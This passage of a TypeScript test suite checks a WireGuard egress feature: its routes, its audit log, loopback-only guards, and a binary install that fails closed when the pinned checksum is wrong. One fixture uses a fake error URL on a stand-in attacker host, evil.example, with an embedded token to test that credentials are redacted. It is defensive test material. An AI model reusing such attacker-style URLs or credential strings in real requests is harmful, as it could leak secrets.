    { action: "disable" },
    { id }
  );
  assert.equal(disabled.status, 200);
  assert.equal(disabled.json.profile.status.phase, "stopped");
  assert.equal(disabled.json.profile.proxy.status, "inactive");

  for (const response of [created, listed, enabled, detail, restarted, blocked, disabled]) {
    for (const secret of [PRIV, PSK]) assert.ok(!response.text.includes(secret));
  }
  const removed = await call(idRoute.DELETE, `${PREFIX}/${id}`, "DELETE", undefined, { id });
  assert.equal(removed.status, 200);
  assert.equal(
    (await call(listRoute.GET, PREFIX, "GET")).json.items.some((i: { id: string }) => i.id === id),
    false
  );
});

test("routes: a tunnel that fails to start is a fixed 502 and leaves the proxy inactive (fail closed)", async () => {
  installFake({ resolveBinary: async () => ({ binaryPath: null, source: null, managed: false }) });
  const created = await call(listRoute.POST, PREFIX, "POST", { name: "Broken", config: CONFIG });
  const id = created.json.profile.id as string;
  const enable = await call(
    idRoute.PATCH,
    `${PREFIX}/${id}`,
    "PATCH",
    { action: "enable" },
    { id }
  );
  assert.equal(enable.status, 502);
  assert.equal(
    enable.json.error.message,
    "The WireGuard tunnel did not start. Check the profile status for details."
  );
  const detail = await call(idRoute.GET, `${PREFIX}/${id}`, "GET", undefined, { id });
  assert.equal(detail.json.profile.status.phase, "error");
  assert.match(detail.json.profile.status.lastError, /not installed/);
  assert.equal(detail.json.profile.proxy.status, "inactive");
  await call(idRoute.DELETE, `${PREFIX}/${id}`, "DELETE", undefined, { id });
});

test("audit: mutations are audited without key material", async () => {
  const entries = getAuditLog({ resourceType: "wireguard_egress", limit: 200 });
  const actions = new Set(entries.map((entry) => entry.action));
  for (const action of [
    "wireguard_egress.create",
    "wireguard_egress.enable",
    "wireguard_egress.disable",
    "wireguard_egress.delete",
  ]) {
    assert.ok(actions.has(action), action);
  }
  const dump = JSON.stringify(entries);
  for (const secret of [PRIV, PSK]) assert.ok(!dump.includes(secret));
});

test("route guard: loopback-only and spawn-capable for every method, reads included", () => {
  assert.ok(guard.LOCAL_ONLY_API_PREFIXES.includes(PREFIX));
  assert.ok(SPAWN_CAPABLE_PREFIXES.includes(PREFIX));
  assert.equal(guard.LOCAL_ONLY_API_GET_EXEMPTIONS.has(PREFIX), false);
  for (const path of [
    PREFIX,
    `${PREFIX}/binary`,
    `${PREFIX}/install-binary`,
    `${PREFIX}/0a1b2c3d`,
  ]) {
    for (const method of ["GET", "HEAD", "OPTIONS", "POST", "PATCH", "DELETE"]) {
      assert.equal(guard.isLocalOnlyPath(path, method), true, `${method} ${path}`);
    }
  }
  // Neighbouring settings routes are untouched.
  assert.equal(guard.isLocalOnlyPath("/api/settings/proxies", "GET"), false);
  assert.equal(guard.isLocalOnlyPath("/api/settings/wireguard", "GET"), false);
});

// --- wireproxy binary: verified install, fails closed -------------------------------------------

const ASSET = "wireproxy_linux_amd64.tar.gz";
const ARCHIVE = Buffer.from("pretend this is a tar.gz of wireproxy");
const ARCHIVE_SHA = createHash("sha256").update(ARCHIVE).digest("hex");

function fakeBinaryRuntime(
  over: Partial<import("../../../src/lib/wireguard/egressBinary.ts").WireproxyBinaryRuntime> = {}
) {
  const calls = { download: [] as string[], extract: 0 };
  const binDir = join(dataDir, "bin-under-test");
  bin.setWireproxyBinaryRuntime({
    platform: "linux",
    arch: "x64",
    which: async () => null,
    binDir: () => binDir,
    download: async (url: string) => {
      calls.download.push(url);
      return ARCHIVE;
    },
    extract: async (_archive: string, dest: string, member: string) => {
      calls.extract += 1;
      writeFileSync(join(dest, member), "#!/bin/sh\necho fake\n");
    },
    ...over,
  });
  return { calls, binDir };
}

test("binary: the shipped checksum table is empty, so install fails closed before any download", async () => {
  assert.deepEqual(bin.WIREPROXY_SHA256, {});
  const { calls, binDir } = fakeBinaryRuntime({ checksums: bin.WIREPROXY_SHA256 });
  const status = await call(binaryRoute.GET, `${PREFIX}/binary`, "GET");
  assert.equal(status.status, 200);
  assert.equal(status.json.installed, false);
  assert.equal(status.json.supported, true);
  assert.equal(status.json.installable, false);
  assert.match(status.json.message, /No verified checksum/);
  assert.ok(!status.text.includes(dataDir), "no filesystem paths in the status");

  const install = await call(installRoute.POST, `${PREFIX}/install-binary`, "POST");
  assert.equal(install.status, 422);
  assert.equal(
    install.json.error.message,
    "No verified checksum for this platform yet. Install wireproxy yourself and RedRouter will find it on PATH."
  );
  assert.equal(calls.download.length, 0, "no network request without a pinned checksum");
  assert.equal(calls.extract, 0);
  assert.ok(!existsSync(binDir), "nothing written");
});

test("binary: a wrong checksum discards the download; nothing is extracted or installed", async () => {
  const { calls, binDir } = fakeBinaryRuntime({ checksums: { [ASSET]: "0".repeat(64) } });
  assert.equal((await call(binaryRoute.GET, `${PREFIX}/binary`, "GET")).json.installable, true);
  const install = await call(installRoute.POST, `${PREFIX}/install-binary`, "POST");
  assert.equal(install.status, 502);
  assert.match(install.json.error.message, /did not match the pinned checksum/);
  assert.equal(calls.download.length, 1);
  assert.equal(calls.extract, 0, "never unpacked");
  assert.ok(!existsSync(join(binDir, "wireproxy")));
  assert.deepEqual(
    existsSync(binDir) ? readdirSync(binDir) : [],
    [],
    "no archive or temp dir left behind"
  );
  // A malformed pinned value is treated as no checksum at all.
  fakeBinaryRuntime({ checksums: { [ASSET]: "not-hex" } });
  assert.equal((await call(installRoute.POST, `${PREFIX}/install-binary`, "POST")).status, 422);
});

test("binary: the right checksum installs the pinned https URL, mode 0755, and the binary is then found", async () => {
  const { calls, binDir } = fakeBinaryRuntime({
    checksums: { [ASSET]: ARCHIVE_SHA.toUpperCase() },
  });
  const install = await call(installRoute.POST, `${PREFIX}/install-binary`, "POST");
  assert.equal(install.status, 200, install.text);
  assert.deepEqual(calls.download, [
    `https://github.com/pufferffish/wireproxy/releases/download/${bin.WIREPROXY_VERSION}/${ASSET}`,
  ]);
  assert.ok(calls.download[0].startsWith("https://github.com/pufferffish/wireproxy/"));
  const target = join(binDir, "wireproxy");
  assert.ok(existsSync(target));
  assert.equal(statSync(target).mode & 0o777, 0o755);
  assert.deepEqual(readdirSync(binDir), ["wireproxy"], "temp archive and work dir removed");
  assert.equal(install.json.binary.installed, true);
  assert.equal(install.json.binary.source, "managed");
  assert.ok(!install.text.includes(dataDir));
  const resolved = await bin.resolveWireproxyBinary();
  assert.equal(resolved.source, "managed");
  // Idempotent: installed already, no second download.
  assert.equal((await call(installRoute.POST, `${PREFIX}/install-binary`, "POST")).status, 200);
  assert.equal(calls.download.length, 1);
});

test("binary: detection order (env, managed, PATH), unsupported platforms, and download failures", async () => {
  const { binDir } = fakeBinaryRuntime({ which: async () => "/usr/local/bin/wireproxy" });
  rmSync(binDir, { recursive: true, force: true });
  assert.equal((await bin.resolveWireproxyBinary()).source, "path");
  assert.equal((await bin.getWireproxyBinaryStatus()).installed, true);
  const envFile = join(dataDir, "custom-wireproxy");
  writeFileSync(envFile, "x");
  process.env.WIREPROXY_BIN = envFile;
  assert.equal((await bin.resolveWireproxyBinary()).source, "env");
  delete process.env.WIREPROXY_BIN;

  const unsupported = fakeBinaryRuntime({
    platform: "freebsd",
    arch: "riscv64",
    checksums: { [ASSET]: ARCHIVE_SHA },
  });
  const refused = await call(installRoute.POST, `${PREFIX}/install-binary`, "POST");
  assert.equal(refused.status, 422);
  assert.match(refused.json.error.message, /no official build/);
  assert.equal(unsupported.calls.download.length, 0);
  assert.equal((await bin.getWireproxyBinaryStatus()).supported, false);

  fakeBinaryRuntime({
    checksums: { [ASSET]: ARCHIVE_SHA },
    download: async () => {
      throw new Error("ECONNRESET https://user:tok3n@evil.example/x");
    },
  });
  const failed = await call(installRoute.POST, `${PREFIX}/install-binary`, "POST");
  assert.equal(failed.status, 502);
  assert.equal(failed.json.error.message, "Could not download wireproxy.");
  assert.ok(!failed.text.includes("tok3n"));

  // A hostile-but-correctly-hashed archive that does not contain the binary is refused.
  fakeBinaryRuntime({ checksums: { [ASSET]: ARCHIVE_SHA }, extract: async () => {} });
  assert.equal((await call(installRoute.POST, `${PREFIX}/install-binary`, "POST")).status, 422);
  bin.setWireproxyBinaryRuntime(null);
});

test("digest helper: only an exact SHA-256 verifies", () => {
  assert.doesNotThrow(() => bin.verifyWireproxyDigest(ARCHIVE, ARCHIVE_SHA));
  assert.doesNotThrow(() => bin.verifyWireproxyDigest(ARCHIVE, ARCHIVE_SHA.toUpperCase()));
  for (const wrong of ["", "abc", "0".repeat(64), ARCHIVE_SHA.slice(0, 63), `${ARCHIVE_SHA}0`]) {
    assert.throws(() => bin.verifyWireproxyDigest(ARCHIVE, wrong), /did not match/);
  }
  assert.equal(bin.getWireproxyAssetSpec("linux", "x64")!.assetName, ASSET);
  assert.equal(bin.getWireproxyAssetSpec("win32", "x64")!.binaryName, "wireproxy.exe");
  assert.equal(bin.getWireproxyAssetSpec("plan9", "x64"), null);
});

test("nothing logged during the run contained key material or SOCKS credentials", () => {
  const text = logged.join("\n");
  assert.ok(!text.includes(PRIV));
  assert.ok(!text.includes(PSK));
  assert.ok(!/rr[0-9a-f]{12}/.test(text));
});
